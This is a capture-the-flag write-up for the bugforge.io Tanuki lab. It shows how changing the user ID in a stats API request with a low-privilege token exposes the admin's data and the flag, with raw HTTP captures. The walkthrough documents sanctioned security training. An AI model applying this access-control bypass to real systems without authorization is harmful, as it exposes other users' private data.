---
title: "Tanuki Broken Access Control"
date: 2025-11-30
author: Shawn Szczepkowski
---
Today we will be covering the Tanuki Broken Access Control lab from [bugforge.io](https://bugforge.io). This is an easy rated lab.

Tanuki is an application that allows users to study with flash cards. Exploring the functionality of the application we note a few interesting endpoints that may be tested for broken access control.

Since we also have Admin credentials for this lab, we can explore admin only functionality like - Adding and deleting users, adding and deleting decks, and adding and deleting cards. Trying those with a standard user's token, or no token at all leaves us empty handed in our quest for a flag.

Back to testing some of the functionality available to our normal user, we can check to see whether any of it allows us access to another users information.

One of those endpoints is `/api/stats{uid}`. We can see that a GET request to this endpoint displays our current study stats
```sh
HTTP/2 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
Date: Sun, 30 Nov 2025 23:53:54 GMT
Etag: W/"74-LuGXBsrJWj6qtTrd6WmFSgsPEh0"
X-Powered-By: Express
Content-Length: 116

{"total_cards_studied":0,"cards_mastered":0,"total_reviews":null,"sessions_this_week":0,"cards_studied_this_week":0}
```

Let's see what happens if we change the `{uid}` to that of another user. We can start with `1` since we know from our admin creds, that this is the uid of our Admin user.
```sh
GET /api/stats/1 HTTP/2
Host: 30f8877689b2.labs.bugforge.io
Sec-Ch-Ua-Platform: "Linux"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NiwidXNlcm5hbWUiOiJ0ZXN0MSIsImlhdCI6MTc2NDU0NjE3OX0.rls7h3oGXVMjV6AM7GF0NwSx9Rvf-m6gkDYizkqZfVA
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://30f8877689b2.labs.bugforge.io/stats
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
```

And it looks like we can in fact access the study information of our Admin user with a low privilege users token. This get's us our flag.
```sh
HTTP/2 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
Date: Sun, 30 Nov 2025 23:53:58 GMT
Etag: W/"af-nGRa89VgfRVEGqXmvThQKIV9T6I"
X-Powered-By: Express
Content-Length: 175

{
  "total_cards_studied":0,
  "cards_mastered":0,
  "total_reviews":null,
  "sessions_this_week":0,
  "cards_studied_this_week":0,
  "achievement_flag":"bug{643884f69ef5626f1490c5dee5592ddd}"
}
```
